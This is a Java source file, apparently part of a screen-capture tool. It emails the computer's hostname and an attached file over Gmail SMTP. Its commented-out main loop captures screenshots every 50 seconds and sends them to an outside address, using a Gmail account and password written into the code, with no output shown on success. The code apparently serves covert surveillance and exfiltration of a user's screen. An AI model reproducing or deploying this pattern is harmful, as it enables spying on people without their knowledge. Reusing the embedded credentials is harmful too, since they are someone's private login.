package Laptop;

import java.time.LocalDate;
import java.util.Properties;

//import javax.activation.*;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.SendFailedException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

@SuppressWarnings("all")
public class SendMail {

	public static void SendMail(String from, String Password, String toAddress, String filename)
			throws MessagingException {
		String cname = String.valueOf(ComputerName.getMachineName());
		String host = "smtp.gmail.com";
		Properties props = System.getProperties();
		props.put("mail.smtp.host", host);
		props.put("mail.smtps.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		Session session = Session.getInstance(props, null);

		MimeMessage message = new MimeMessage(session);

		message.setFrom(new InternetAddress(from));

		message.setRecipients(Message.RecipientType.TO, toAddress);
		LocalDate myObj = LocalDate.now();
		String date = String.valueOf(myObj);
		message.setSubject(date);

		BodyPart messageBodyPart = new MimeBodyPart();

		messageBodyPart.setText(cname);

		Multipart multipart = new MimeMultipart();

		multipart.addBodyPart(messageBodyPart);

		messageBodyPart = new MimeBodyPart();

		DataSource source = new FileDataSource(filename);

		messageBodyPart.setDataHandler(new DataHandler(source));

		messageBodyPart.setFileName(filename);

		multipart.addBodyPart(messageBodyPart);

		message.setContent(multipart);

		try {
			Transport tr = session.getTransport("smtps");
			tr.connect(host, from, Password);
			tr.sendMessage(message, message.getAllRecipients());
//			System.out.println("Mail Sent Successfully");
			tr.close();

		} catch (SendFailedException sfe) {

			System.out.println(sfe);
		}
	}

//	public static void main(String[] args) throws AWTException, IOException, InterruptedException {
//
//		try {
//
//			int i = 0;
//			while (i < 10) {
//				File file = null;
//				String link = new ScreenShot().getScreen(file).toString();
//				new SendMail("godfrey1363@gmail.com", "sohrab1363", "msfata@yahoo.com", link);
//				Thread.sleep(50000);
//				i++;
//			}
//
//		} catch (MessagingException e) {
//			e.printStackTrace();
//		}
//
//	}
}